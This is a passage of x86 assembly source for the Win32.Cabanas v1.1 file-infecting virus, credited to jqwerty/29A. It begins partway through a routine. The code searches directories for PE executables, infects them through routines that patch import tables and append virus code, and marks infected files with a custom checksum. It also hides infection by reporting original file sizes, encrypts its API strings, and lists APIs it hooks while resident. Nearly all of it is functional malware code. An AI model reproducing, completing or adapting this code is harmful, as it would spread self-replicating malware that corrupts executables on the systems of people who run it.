        or      byte ptr [ebx.SH_Characteristics.hiw.hib - x],0C0h      ;change section flagz
        push    ebp
        mov     eax,[esi.NT_OptionalHeader.OH_CheckSum - MZ_lfanew]     ;calculate special checksum to mark infected filez
        xor     ebp,eax
        add     al,-2Dh
        xor     ebp,0B2FD26A3h xor 0D4000000h
        not     al
        xor     al,ah
        shl     ebp,6
        xor     al,byte ptr [esi.NT_OptionalHeader.OH_CheckSum.hiw - MZ_lfanew]
        shr     al,2
        shld    eax,ebp,3*8+2
        mov     [esi.NT_FileHeader.FH_TimeDateStamp - MZ_lfanew],eax    ;store checksum value
        pop     eax                     ;get original file size
        mov     cl,65h
        cmp     eax,edi                 ;calculate new file size..
        .if     carry?
        xchg    edi,eax
        .endif
        sub     eax,1 - 65h
        div     ecx
        mul     ecx                     ;use size paddin..
        push    eax

end_Attach:

        popad

needed_ret:

        ret

Attach  endp

Process_Dir:    ;this function receives a pointer to an asciiz string
                ;  containin a path, then it searches filez with an extension
                ;  matchin the list of extensionz, and finaly infects them.
                ;on entry:
                ;  EDI = pointer to pathname
                ;  EAX = size of pathname

        dec     eax
        cmp     eax,7Fh
        jnc     needed_ret      ;if pathname greater than 7Fh characterz, jump
        pushad
        mov     esi,edi
        adc     edi,eax
        cld
        mov     al,'\'          ;add '\' to the pathname if not included
        cmp     [edi-1],al
        jz      Find_Filez
        stosb

Find_Filez:     ;find filez in the specified pathname..

        push    edi
        sub     eax,'\' - '*.*'
        stosd
        call    findfirst       ;find each file "*.*" in the path
        pop     edi
        jz      end_Attach      ;if error, jump
        dec     eax
        push    eax             ;save search handle

Process_File:                   ;a file was found, process it

        push    edi
        lea     esi,[ebx.WFD_szFileName]        ;get filename
        call    Process_File3                   ;process file, infect it

Find_Next:

        pop     edi
        pop     eax
        push    eax
        push    ebx
        push    eax
        call    [ebp + ddFindNextFileA - ebp_num]       ;find next file
        test    eax,eax                                 ;more filez?
        jnz     Process_File                            ;yea, process it, jump

Find_Close:

        call    [ebp + ddFindClose - ebp_num]           ;close search

end_Find:

end_Process_Dir:

        popad
        ret

APICall@n_2:    mov     cl,2            ;call an API and pass two parameterz

APICall@n       proc    ;this function calls an API and passes "n" parameterz
                        ;  as argumentz
                        ;on entry:
                        ;  EAX = API function adress
                        ;  ECX = number of paremeterz

                pushfd
                movzx   edx,cl
                mov     ecx,edx
     push_args: push    dword ptr [esp.(2*Pshd) + 4*edx]        ;push parameter
                loop    push_args
                call    eax                                     ;call API
                popfd
                ret
APICall@n       endp

IGetProcAddressIT:

        pop     edx
        push    eax
        lea     eax,[ebp + vszKernel32 - ebp_num]
        push    eax
        push    edx

GetProcAddressIT proc  ;gets a pointer to an API function from the Import Table
                       ;  (the object inspected is in raw form, i.e. memory-maped)
                       ;on entry:
                       ;  TOS+08h (Arg2): API function name
                       ;  TOS+04h (Arg1): module name
                       ;  TOS+00h (return adress)
                       ;on exit:
                       ;  EAX = RVA pointer to IAT entry
                       ;  EAX = 0, if not found

        pushad

        lea     esi,[ecx.MZ_lfanew]
        mov     ebp,ecx                 ;get KERNEL32 module handle
        add     esi,[esi]               ;get address of PE header + MZ_lfanew
        mov     ecx,[esi.NT_OptionalHeader    \ ;get size of import directory
                        .OH_DirectoryEntries  \
                        .DE_Import            \
                        .DD_Size              \
                        -MZ_lfanew]
        jecxz   End_GetProcAddressIT2   ;if size is zero, no API imported!
        mov     eax,[esi.NT_OptionalHeader    \ ;get address of Import directory
                        .OH_DirectoryEntries  \
                        .DE_Import            \
                        .DD_VirtualAddress    \
                        -MZ_lfanew]
        call    Rva2Raw                 ;find size and raw start of import section
        jecxz   End_GetProcAddressIT
        push    esi
        mov     eax,[esp.(Pshd).Pushad_ebp]
        mov     [eax + ImportHdr - ebp_num],ecx ;save raw adress of import section header for l8r use
        x =     IMAGE_SIZEOF_IMPORT_DESCRIPTOR

Get_DLL_Name:   ;scan each import descriptor inside import section to match module name specified

        pop     esi                     ;diference (if any) between start of import table and start of import section
        mov     ecx,[ebx.esi.ID_Name]   ;get RVA pointer to imported module name

End_GetProcAddressIT2:

        jecxz   End_GetProcAddressIT    ;end of import descriptorz?
        sub     ecx,edx                 ;convert RVA pointer to RAW
        cmp     ecx,ebp                 ;check if it points inside section
        jae     End_GetProcAddressIT
        sub     esi,-x
        push    esi                     ;save next import descriptor for later retrieval
        lea     esi,[ebx + ecx]
        mov     edi,[esp.(Pshd).cPushad.Arg1]   ;get module name specified from Arg1

Next_char_from_DLL:     ;do a char by char comparison with module name found inside seccion
                        ;stop when a NULL or a dot '.' is found
        lodsb
        add     al,-'.'
        jz      IT_nup          ;its a dot
        sub     al,-'.'+'a'
        cmp     al, 'z'-'a'+ 1
        jae     no_up
        add     al,-20h         ;convert to upercase
 no_up: sub     al,-'a'
IT_nup: scasb
        jnz     Get_DLL_Name            ;namez dont match, get next import descriptor
        cmp     byte ptr [edi-1],0
        jnz     Next_char_from_DLL

Found_DLL_name: ;we got the import descriptor containin specified module name

        pop     esi
        lea     eax,[edx + esi.ID_ForwarderChain - x]
        add     esi,ebx
        mov     [esp.Pushad_edx],eax            ;store pointer to ForwarderChain field for later use
        mov     [esp.Pushad_esi],esi            ;store pointer to import descriptor for later use
        push    dword ptr [esp.cPushad.Arg2]
        mov     eax,[esp.(Pshd).Pushad_ebp]
        push    dword ptr [eax + K32Mod - ebp_num]
        call    GetProcAddressET                ;scan export table of specified module handle
        xchg    eax,ecx                         ;and get function adress of specified API
        mov     ecx,[esi.ID_FirstThunk - x]     ;This is needed just in case the API function adressez are bound in the IAT
        jecxz   End_GetProcAddressIT            ;if not found then go, this value cant be zero or the IAT wont be patched
        push    eax                             
        call    GetProcAddrIAT                  ;inspect first thunk (which later will be patched by the loader)
        test    eax,eax                         
        jnz     IAT_found                       ;if found then jump (save it and go)
        mov     ecx,[esi.ID_OriginalFirstThunk - x]     ;get original thunk (which later will hold the original unpatched IAT)
        jecxz   End_GetProcAddressIT            ;if not found then go, this value could be zero
        push    eax                             
        call    GetProcAddrIAT                  ;inspect original thunk
        test    eax,eax                         
        jz      IAT_found                       ;jump if not found
        sub     eax,ecx                         ;we got the pointer
        add     eax,[esi.ID_FirstThunk - x]     ;convert it to RVA
        db      6Bh,33h,0C0h    ;imul   esi,[ebx],-0C0h ;i like bizarre thingz =8P
        org     $ - 2

End_GetProcAddressIT:

        db      33h,0C0h ;xor eax,eax   ;error, adress not found

IAT_found:

        mov     [esp.Pushad_eax],eax    ;save IAT entry pointer
        popad
        ret     (2*Pshd)                ;jump and unwind parameterz in stack

findfirst:      ;this function is just a wraper to the FindFistFileA API..

        lea     ebx,[ebp + FindData - ebp_num]
        push    ebx                                     ;args for findfirst
        push    esi                                     ;args for findfirst
        call    [ebp + ddFindFirstFileA - ebp_num]      ;call FindFirstFileA API

end_findfirst:

        inc     eax
        cld
        ret

get_size:       ;this function retrieves the file size and discards
                ;  huge filez, it also sets some parameterz for l8r use
                ;on entry:
                ;  EBX = pointer to WIN32_FIND_DATA structure
                ;on exit:
                ;  EAX = file size
                ;  ESI = pointer to filename
                ;  Carry clear: file ok
                ;  Carry set: file too large

        xor     ecx,ecx
        test    byte ptr [ebx.WFD_dwFileAttributes],FILE_ATTRIBUTE_DIRECTORY
        jnz     get_size_ret                    ;discard directory entriez
        mov     edx,ecx
        cmp     [ebx.WFD_nFileSizeHigh],edx     ;discard huge filez, well if any thaat big (>4GB)
        mov     cl,65h                          ;load size padin value
        lea     esi,[ebp + PathName - ebp_num]  ;get pointer to filename
        mov     eax,[ebx.WFD_nFileSizeLow]      ;get file size
        
get_size_ret:

        ret

GetProcAddrIAT: ;this function scans the IMAGE_THUNK_DATA array of "dwords"
                ;  from the selected IMAGE_IMPORT_DESCRIPTOR, searchin for
                ;  the selected API name. This function works for both
                ;  bound and unbound import descriptorz. This function is
                ;  called from inside GetProcAddressIT.
                ;on entry:
                ;  EBX = RAW start pointer of import section
                ;  ECX = RVA pointer to IMAGE_THUNK_ARRAY
                ;  EDX = RVA start pointer of import section
                ;  EDI = pointer selected API function name.
                ;  EBP = RAW size of import section
                ;  TOS+04h (Arg1): real address of API function inside selected
                ;                  module (in case the descriptor is unbound).
                ;  TOS+00h (return adress)
                ;on exit:
                ;  EAX = RVA pointer to IAT entry
                ;  EAX = 0, if not found

        push    ecx
        push    esi
        sub     ecx,edx
        xor     eax,eax
        cmp     ecx,ebp
        jae     IT_not_found
        lea     esi,[ebx + ecx] ;get RAW pointer to IMAGE_THUNK_DATA array

next_thunk_dword:

        lodsd                   ;get dword value
        test    eax,eax         ;end of IMAGE_THUNK_DATA array?
        jz      IT_not_found

no_ordinal:

        sub     eax,edx                 ;convert dword to a RAW pointer
        cmp     eax,ebp                 ;dword belongs to an unbound image descriptor?
        jb      IT_search               ;no, jump
        add     eax,edx                 ;yea, we have the API adress itself, reconvert to RVA
        cmp     eax,[esp.(2*Pshd).Arg1] ;API adressez match?
        jmp     IT_found?               ;yea, we found it, jump

IT_search:

        push    esi                             ;image descriptor contains imports by name
        lea     esi,[ebx+eax.IBN_Name]          ;get API name from import descriptor
        mov     edi,[esp.(5*Pshd).cPushad.Arg2] ;get API name selected as a parameter

IT_next_char:   ;find requested API from all imported API namez..

        cmpsb                   ;do APIz match?
        jnz     IT_new_search   ;no, continue searchin

IT_Matched_char:

        cmp     byte ptr [esi-1],0
        jnz     IT_next_char

IT_new_search:

        pop     esi             ;yea, they match, we found it
        
IT_found?:

        jnz     next_thunk_dword
        lea     eax,[edx+esi-4] ;get the pointer to the new IAT entry
        sub     eax,ebx         ;convert it to RVA

IT_not_found:

        pop     esi
        pop     ecx
        ret     (Pshd)

GetProcAddressIT        ENDP

check_PE_file:  ;this function opens, memory-maps a file and checks
                ;  if its a PE file
                ;on entry:
                ;  EBX = pointer to WIN32_FIND_DATA structure
                ;  ESI = pointer to filename
                ;on exit:
                ;  ESI = 0, file already infected or not infectable
                ;  ESI != 0, file not infected

        call    Open&MapFile                    ;open and memory-map the file
        jecxz   end_PE_file
        mov     eax,[ebx.WFD_nFileSizeLow]      ;get file size
        add     eax,-80h
        jnc     Close_File                      ;file too short?

Check_PE_sign:  ;this function checks validity of a PE file.
                ;on entry:
                ;  ECX = base address of memory-maped file
                ;  EBX = pointer to WIN32_FIND_DATA structure
                ;  EAX = host file size - 80h
                ;on exit:
                ;  ESI = 0, file already infected or not infectable
                ;  ESI != 0, file not infected          

        cmp     word ptr [ecx],IMAGE_DOS_SIGNATURE      ;needs MZ signature
        jnz     Close_File
        mov     edi,[ecx.MZ_lfanew]     ;get ptr to new exe format
        cmp     eax,edi                 ;ptr out of range?
        jb      Close_File
        add     edi,ecx
        cmp     dword ptr [edi],IMAGE_NT_SIGNATURE      ;check PE signature
        jnz     Close_File
        cmp     word ptr [edi.NT_FileHeader.FH_Machine], \      ;must be 386+ machine
                IMAGE_FILE_MACHINE_I386
        jnz     Close_File
        mov     eax,dword ptr [edi.NT_FileHeader.FH_Characteristics]
        not     al
        test    ax,IMAGE_FILE_EXECUTABLE_IMAGE or \     ;must have the executable bit but cant be a DLL
                   IMAGE_FILE_DLL
        jnz     Close_File
        
        ;at this point, calculate virus checksum to make sure file is really
        ;infected. If its infected then return original size of host previous
        ;to infection and store it in the WIN32_FIND_DATA structure (stealth).

        mov     eax,[edi.NT_OptionalHeader.OH_CheckSum] ;get checksum field
        push    eax
        sub     al,2Dh          ;calculate virus checksum to make sure file is really infected
        xor     ah,al
        mov     al,[edi.NT_FileHeader.FH_TimeDateStamp.hiw.hib]
        xor     ah,byte ptr [edi.NT_OptionalHeader.OH_CheckSum.hiw]
        and     al,11111100b
        xor     ah,al
        mov     [ebp + uni_or_ansi - ebp_num],ah
        inc     ah
        pop     eax
        jnz     go_esi
        xor     eax,0B2FD26A3h xor 68000000h
        xor     eax,[edi.NT_FileHeader.FH_TimeDateStamp]
        and     eax,03FFFFFFh
        cmp     eax,[ebx.WFD_nFileSizeLow]
        jnc     go_esi
        mov     [ebx.WFD_nFileSizeLow],eax      ;return original file size
go_esi: inc     esi                             ;set "already infected" mark

Close_File:

        call    Close&UnmapFile         ;close and unmaps file

end_PE_file:

        dec     esi
        ret

pop_ebp:                ;get the ebp_num value needed to access variablez thru EBP
        pop     ebp
        if      (ebp_num - m_ebp)
        lea     ebp,[ebp + ebp_num - m_ebp]
        endif
        mov     [ebp + uni_or_ansi - ebp_num],al
        cld

another_ret:

        ret

Process_File2:  ;this function checks the file size, retrieves some key API
                ;  adressez from inside the import table and infects the file.
                ;on entry:
                ;  EBX = pointer to WIN32_FIND_DATA structure
                ;  ESI = pointer to filename

        call    get_size
        jnz     another_ret             ;if file size too short, jump
        cmp     eax,4000000h - 10*1024
        jnc     another_ret             ;if file size too large (>64MB), jump
        div     ecx                     ;check infection thru size paddin
        dec     edx
        js      another_ret             ;already infected, jump
        call    check_PE_file           ;open file, check PE signature and close file
        jnz     another_ret             ;not valid PE file, jump
        inc     byte ptr [ebp + uni_or_ansi - ebp_num]  ;double-check file
        jz      another_ret                             ;discard if infected

Bless:  ;this function prepares the host file for infection: blank file
        ;  atributez, open and map file in r/w mode, retrieves RVA pointerz
        ;  to GetModuleHandleA, GetModuleHandleW and GetProcAddress, call
        ;  the "Attach" function to infect the file and finaly restore
        ;  date/time stamp and attributez

        push    esi
        lea     esi,[ebp + PathName - ebp_num]  ;get pointer to filename
        push    esi
        call    [ebp + ddSetFileAttributesA - ebp_num]  ;blank file atributez
        xchg    ecx,eax
        jecxz   another_ret     ;if error, jump, if disk is write-protected for example
        push    esi
        mov     edi,virtual_end - code_start    ;calculate buffer size needed for infection
        add     edi,[ebx.WFD_nFileSizeLow]      ;add to original size
        call    Open&MapFileAdj                 ;open and map file in read/write mode
        jecxz   end_Bless2                      ;if any error, if file is locked for example, jump

        lea     eax,[ebp + vszGetModuleHandleA - ebp_num]
        call    IGetProcAddressIT               ;get RVA pointer to GetModuleHandleA API in the import table
        test    esi,esi
        jz      end_Bless3                      ;if KERNEL32 import descriptor not found, dont infect

        x =     IMAGE_SIZEOF_IMPORT_DESCRIPTOR

        mov     [ebp + ptrForwarderChain - ebp_num],edx         ;store RVA pointer to ForwarderChain field from KERNEL32 import descriptor
        mov     edx,[esi.ID_ForwarderChain - x]
        mov     [ebp + ddGetModuleHandleA - ebp_num],eax        ;store RVA pointer to GetModuleHandleA API
        mov     [ebp + ddForwarderChain - ebp_num],edx          ;store actual ForwarderChain field value from KERNEL32 import descriptor
        cdq     ;edx=0
        dec     eax                             ;if RVA pointer to GetModuleHandleA found, jump and store null for GetModulehandleW RVA pointer (not needed)
        jns     StoreHandleW
        lea     eax,[ebp + vszGetModuleHandleW - ebp_num]
        call    IGetProcAddressIT               ;get RVA pointer to GetProcAddress API in the import table
        xchg    eax,edx
        test    edx,edx                         ;if found, jump and store GetModuleHandleW RVA pointer
        jnz     StoreHandleW

        cmp     [esi.ID_TimeDateStamp - x],edx  ;shit, not found, now check if KERNEL32 API adressez are binded
        jz      StoreHandleW
        cmp     edx,[esi.ID_OriginalFirstThunk - x]
        jz      end_Bless3
        mov     [esi.ID_TimeDateStamp - x],edx

StoreHandleW:

        mov     [ebp + ddGetModuleHandleW - ebp_num],edx        ;store RVA pointer to GetModuleHandleW API
        lea     eax,[ebp + vszGetProcAddress - ebp_num]
        call    IGetProcAddressIT                               ;get RVA pointer to GetModuleHandleA API in the import table
        mov     [ebp + ddGetProcAddress - ebp_num],eax          ;store RVA pointer to GetModuleHandleW API if found, store zero if not found anywayz

        call    Attach  ;infect file
                        ;at this point:
                        ;  ECX = host base adress, start of memory-maped file
                        ;  EDI = original file size

end_Bless3:

        call    Close&UnmapFileAdj      ;close, unmap file and restore other setingz if necesary

end_Bless2:

        pop     esi                             ;get pointer to filename
        mov     ecx,[ebx.WFD_dwFileAttributes]  ;get original file atributez
        jecxz   end_Bless1
        push    ecx
        push    esi
        call    [ebp + ddSetFileAttributesA - ebp_num]  ;restore original file atributez

end_Bless1:

end_Process_File2:

        ret

GetProcAddressET proc ;This function is similar to GetProcAddressIT except
                      ;  that it looks for API functions in the export table
                      ;  of a given DLL module. It has the same functionality
                      ;  as the original GetProcAddress API exported from
                      ;  KERNEL32 except that it is able to find API
                      ;  functions exported by ordinal from KERNEL32.
                      ;on entry:
                      ;  TOS+08h (Arg2): pszAPIname (pointer to API name)
                      ;  TOS+04h (Arg1): module handle/base address of module
                      ;  TOS+00h (return adress)
                      ;on exit:
                      ;  ECX = API function address
                      ;  ECX = 0, if not found

        pushad
        @SEH_SetupFrame 
        mov     eax,[esp.(2*Pshd).cPushad.Arg1] ;get Module Handle from Arg1
        mov     ebx,eax
        add     eax,[eax.MZ_lfanew]             ;get address of PE header
        mov     ecx,[eax.NT_OptionalHeader    \ ;get size of Export directory
                        .OH_DirectoryEntries  \
                        .DE_Export            \
                        .DD_Size]
        jecxz   Proc_Address_not_found          ;size is zero, no API exported
        mov     ebp,ebx                         ;get address of Export directory
        add     ebp,[eax.NT_OptionalHeader    \
                        .OH_DirectoryEntries  \
                        .DE_Export            \
                        .DD_VirtualAddress]
ifdef   Ordinal
        mov     eax,[esp.(2*Pshd).cPushad.Arg2] ;get address of requested API from Arg2
        test    eax,-10000h                     ;check if Arg2 is an ordinal
        jz      Its_API_ordinal
endif

Its_API_name:

        push    ecx
        mov     edx,ebx                         ;get address of exported API namez
        add     edx,[ebp.ED_AddressOfNames]
        mov     ecx,[ebp.ED_NumberOfNames]      ;get number of exported API namez
        xor     eax,eax
        cld

Search_for_API_name:

        mov     esi,ebx                         ;get address of next exported API name
        add     esi,[edx+eax*4]
        mov     edi,[esp.(3*Pshd).cPushad.Arg2] ;get address of requested API name from Arg2

Next_Char_in_API_name:

        cmpsb                           ;find requested API from all exported API namez
        jz      Matched_char_in_API_name
        inc     eax
        loop    Search_for_API_name
        pop     eax

Proc_Address_not_found:

        xor     eax,eax                 ;API not found
        jmp     End_GetProcAddressET

ifdef   Ordinal

Its_API_ordinal:

        sub     eax,[ebp.ED_BaseOrdinal]        ;normalize Ordinal, i.e. convert it to an index
        jmp     Check_Index
endif

Matched_char_in_API_name:

        cmp     byte ptr [esi-1],0              ;end of API name reached ?
        jnz     Next_Char_in_API_name
        pop     ecx
        mov     edx,ebx                         ;get address of exported API ordinalz
        add     edx,[ebp.ED_AddressOfOrdinals]
        movzx   eax,word ptr [edx+eax*2]        ;get index into exported API functionz

Check_Index:

        cmp     eax,[ebp.ED_NumberOfFunctions]  ;check for out of range index
        jae     Proc_Address_not_found
        mov     edx,ebx                         ;get address of exported API functionz
        add     edx,[ebp.ED_AddressOfFunctions]
        add     ebx,[edx+eax*4]         ;get address of requested API function
        mov     eax,ebx
        sub     ebx,ebp                 ;take care of forwarded API functionz
        cmp     ebx,ecx
        jb      Proc_Address_not_found

End_GetProcAddressET:

        mov     [esp.(2*Pshd).Pushad_ecx],eax   ;set requested Proc Address, if found
        @SEH_RemoveFrame
        popad
        jmp     Ret2Pshd

GetProcAddressET endp

goto_GetProcAddressET:

        jmp     GetProcAddressET

MyGetProcAddressK32:    ;this function is simply a wraper to the GetProcAddress
                        ;  API. It retrieves the address of an API function
                        ;  exported from KERNEL32.
                        ;on entry:
                        ;  EBX = KERNEL32 module handle
                        ;  ESI = pszAPIname (pointer to API name)
                        ;on exit:
                        ;  ECX = API function address
                        ;  ECX = 0, if not found

        pop     eax
        push    esi
        push    ebx
        push    eax

MyGetProcAddress proc   ;this function retrieves API adressez from KERNEL32

        mov     ecx,?                   ;this dynamic variable will hold an RVA pointer to the GetProcAddress API in the IAT
ddGetProcAddress = dword ptr $ - 4
        jecxz   goto_GetProcAddressET
        push    esi
        push    ebx
        add     ecx,[ebp + phost_hdr - ebp_num]
        call    [ecx]                           ;call the original GetProcAddress API
        xchg    ecx,eax
        jecxz   goto_GetProcAddressET   ;if error, call my own GetProcAddress function

Ret2Pshd:

        ret     (2*Pshd)

MyGetProcAddress endp

MyGetModuleHandleW:     ;this function retrieves the base address/module handle
                        ;  of KERNEL32 module previosly loaded to memory asumin
                        ;  the GetModuleHandleW API was found in the import
                        ;  table of the host

        mov     ecx,?                   ;this dynamic variable will hold an RVA pointer to the GetModuleHandleW API in the IAT
ddGetModuleHandleW = dword ptr $ - 4
        jmp     MyGetModuleHandle

MyGetModuleHandleA:     ;this function retrieves the base address/module handle
                        ;  of KERNEL32 module previosly loaded to memory asumin
                        ;  the GetModuleHandleA API was found in the import
                        ;  table of the host

        mov     ecx,?                   ;this dynamic variable will hold an RVA pointer to the GetModuleHandleA API in the IAT
ddGetModuleHandleA = dword ptr $ - 4

MyGetModuleHandle proc  ;this function retrieves the base adress of KERNEL32
                        ;on entry:
                        ;  ECX = RVA pointer to GetModuleHandle(A/W) in the IAT
                        ;  TOS+04h (Arg1): pointer to KERNEL32 module name
                        ;  TOS+00h (return adress)
                        ;on exit:
                        ;  Zero flag set = Base adress not found
                        ;  Zero flag clear = Base adress found
                        ;  EAX = KERNEL32 base adress

        sub     eax,eax                         ;set zero flag
        pop     ebx                             ;get return adress
        pop     eax                             ;Arg1
        push    ebx                             ;push return adress
        mov     ebx,[ebp + phost_hdr - ebp_num] ;get actual host base adress
        jecxz   end_MyGetModuleHandle           ;if not valid GetModuleHandle(A/W) RVA, jump
        push    eax
        call    [ebx + ecx]                     ;call GetModuleHandle(A/W) API
 chk_0: inc     eax
        jz      end_MyGetModuleHandle           ;if any error, not found, jump
        dec     eax

end_MyGetModuleHandle:

        ret

MyGetModuleHandleX:     ;this function retrieves the KERNEL32 base adress
                        ;  via an undocumented method. This function procedure
                        ;  doesnt work in Winblowz NT

        mov     eax,[ebx + 12345678h]
ptrForwarderChain = dword ptr $ - 4
        cmp     eax,12345678h
ddForwarderChain = dword ptr $ - 4
        jnz     chk_0
        ret

MyGetModuleHandle endp

get_ebp2:       mov     al,0
                jnc     get_ebp         ;clear carry (unicode version)
                dec     eax             ;clear set (ansi version)

get_ebp:        call    pop_ebp

m_ebp:

v_end:                                  ;virus code ends here

;uninitialized data     ;these variablez will be adressed in memory, but dont waste space in the file

ImportHdr               dd      ?       ;import table RVA of current host
pCodeTable              dd      ?       ;pointer to encrypted chunkz of code    ;these 2 variables may overlap.
                        org     $ - 4                                           ;one is used at instalation stage,
pHandlez                dd      ?       ;pointer to top of Handlez table        ;the other one used when resident.
phost_hdr               dd      ?       ;pointer to actual base adress of host
pcode_start             dd      ?       ;pointer to start of virus code/data in memory
K32Mod                  dd      ?       ;KERNEL32 base adress
ddGetProcAddress2       dd      ?       ;adress where GetProcAddress API will be stored         ;these 2 variables may overlap.
                        org     $ - 4                                                           ;one is used at instalation stage,
pPathNamez              dd      ?       ;pointer to top of PathNamez table                      ;the other one used when resident.
pNewAPIs                dd      ?       ;pointer to new API entry in the jump table
uni_or_ansi             db      ?       ;needed to diferentiate unicode from ansi stringz

FunctionAdressez:       ;this dwordz will hold the API function adressez used by the virus

ddCreateFileA           dd      ?
ddCreateFileW           dd      ?
ddFindClose             dd      ?
ddFindFirstFileA        dd      ?
ddFindFirstFileW        dd      ?
ddFindNextFileA         dd      ?
ddFindNextFileW         dd      ?
ddSetFileAttributesA    dd      ?
ddSetFileAttributesW    dd      ?
ddCloseHandle           dd      ?

ddCreateFileMappingA    dd      ?
ddMapViewOfFile         dd      ?
ddUnmapViewOfFile       dd      ?
ddSetFilePointer        dd      ?
ddSetEndOfFile          dd      ?
ddSetFileTime           dd      ?
ddGetWindowsDirectoryA  dd      ?
ddGetSystemDirectoryA   dd      ?
ddGetCurrentProcess     dd      ?
ddGetModuleFileName     dd      ?
ddWriteProcessMemory    dd      ?
ddWideCharToMultiByte   dd      ?
ddVirtualAlloc          dd      ?

v_stringz:              ;the API namez used by the virus are decrypted here

vszKernel32             db      'KERNEL32',0
vszGetModuleHandleA     db      'GetModuleHandleA',0
vszGetModuleHandleW     db      'GetModuleHandleW',0

Exts                    db      'fxEtcR'        ;list of extensionz to infect
                        db      0

FunctionNamez2:         ;resident API namez, needed for dynamically API hookin

vszGetProcAddress       db      'GetProcAddress',0
vszGetFileAttributesA   db      'GetFileAttributesA',0
vszGetFileAttributesW   db      'GetFileAttributesW',0
vszMoveFileExA          db      'MoveFileExA',0
vszMoveFileExW          db      'MoveFileExW',0
vsz_lopen               db      '_lopen',0
vszCopyFileA            db      'CopyFileA',0
vszCopyFileW            db      'CopyFileW',0
vszOpenFile             db      'OpenFile',0
vszMoveFileA            db      'MoveFileA',0
vszMoveFileW            db      'MoveFileW',0
vszCreateProcessA       db      'CreateProcessA',0
vszCreateProcessW       db      'CreateProcessW',0

FunctionNamez:

vszCreateFileA          db      'CreateFileA',0
vszCreateFileW          db      'CreateFileW',0
vszFindClose            db      'FindClose',0
vszFindFirstFileA       db      'FindFirstFileA',0
vszFindFirstFileW       db      'FindFirstFileW',0
vszFindNextFileA        db      'FindNextFileA',0
vszFindNextFileW        db      'FindNextFileW',0
vszSetFileAttributesA   db      'SetFileAttributesA',0
vszSetFileAttributesW   db      'SetFileAttributesW',0

non_res:                ;non-resident API namez

vszCloseHandle          db      'CloseHandle',0
vszCreateFileMappingA   db      'CreateFileMappingA',0
vszMapViewOfFile        db      'MapViewOfFile',0
vszUnmapViewOfFile      db      'UnmapViewOfFile',0
vszSetFilePointer       db      'SetFilePointer',0
vszSetEndOfFile         db      'SetEndOfFile',0
vszSetFileTime          db      'SetFileTime',0
vszGetWindowsDirectory  db      'GetWindowsDirectoryA',0
vszGetSystemDirectory   db      'GetSystemDirectoryA',0
vszGetCurrentProcess    db      'GetCurrentProcess',0
vszGetModuleFileName    db      'GetModuleFileNameA',0
vszWriteProcessMemory   db      'WriteProcessMemory',0
vszWideCharToMultiByte  db      'WideCharToMultiByte',0
vszVirtualAlloc         db      'VirtualAlloc',0

EndOfFunctionNamez      db      0

szCopyright     db      "(c) Win32.Cabanas v1.1 by jqwerty/29A.",0

                org     (non_res + 1)
v_end2:

NewAPItable     db nAPIS dup (?)

FindData        WIN32_FIND_DATA ?       ;this structure will hold data retrieved trhu FindFirst/Next APIz

PathName        db MAX_PATH dup (?)     ;filenamez will be stored here for infection

virtual_end:    ;end of virus virtual memory space (in PE filez)

Handlez         db nHANDLEZ dup (?)     ;Handlez table

PathNamez       db nPATHNAMEZ dup (?)   ;PathNamez table

virtual_end2:   ;end of virus virtual memory space (in flat memory)

first_generation:   ;this routine will be called only once from the first generation sample,
                    ;it initializes some variables needed by the virus in the first run.
jumps
        push    NULL
        call    GetModuleHandleA
        test    eax,eax
        jz      exit
        xchg    ecx,eax
        call    ref
   ref: pop     ebx

        mov     eax,ebx
        sub     eax,ref - host
        sub     eax,ecx
        sub     eax,[add_1st_val]
        mov     [ebx + code_table - ref],eax

        mov     al,6Ah
        ror     al,1
        xor     al,[xor_2nd_val]
        mov     [ebx + code_table + 6 - ref],al

        mov     eax,ebx
        sub     eax,ref - code_table
        sub     eax,ecx
        neg     eax
        mov     [ebx + delta_host - ref],eax

        mov     [ebx + old_base - ref],ecx

        mov     eax,[ebx + pfnGMH - ref]
        .if     word ptr [eax] == 25FFh         ;jmp [xxxxxxxx]
        mov     eax,[eax + 2]
        .endif
        sub     eax,ecx
        mov     [ebx + ddGetModuleHandleA - ref],eax   ;set GetModuleHandleA RVA pointer

        mov     eax,[ebx + pfnGPA - ref]
        .if     word ptr [eax] == 25FFh         ;jmp [xxxxxxxx]
        mov     eax,[eax + 2]
        .endif
        sub     eax,ecx
        mov     [ebx + ddGetProcAddress - ref],eax     ;set GetProcAddress RVA pointer

        cld                             ;encrypt API stringz
        mov     ecx,ve_string_size              
        lea     esi,[ebx + ve_stringz - ref]
        mov     edi,esi

encrypt_stringz:

        lodsb
        cmp     al,80h  
        lahf            
        xor     al,0B5h
        ror     al,cl
        stosb
        sahf
        .if     zero?
        movsb
        .endif
        dec     ecx
        cmp     ecx,10
        jnz     encrypt_stringz

        mov     ecx,v_end2 - v_stringz
        lea     edi,[ebx + v_stringz - ref]
        mov     al,-1
        rep     stosb

        jmp     v_start

pfnGMH  dd      offset GetModuleHandleA
pfnGPA  dd      offset GetProcAddress

;Host code starts here

extrn   MessageBoxA: proc
extrn   ExitProcess: proc

host:   push    MB_OK                                   ;display message box
        @pushsz "(c) Win32.Cabanas v1.1 by jqwerty/29A"
        @pushsz "First generation sample"
        push    NULL
        call    MessageBoxA

exit:   push    0               ;exit host
        call    ExitProcess

        end     first_generation


 

